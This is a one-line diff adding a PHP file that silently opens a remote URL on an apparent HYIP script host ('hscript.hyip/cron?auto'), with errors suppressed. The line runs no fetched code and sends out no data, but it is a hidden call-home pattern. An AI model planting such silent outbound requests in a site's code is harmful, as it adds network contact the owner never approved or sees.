@@ -1,0 +1,1 @@
+<?php @fclose(@fopen('http://hscript.hyip/cron?auto', 'r'));
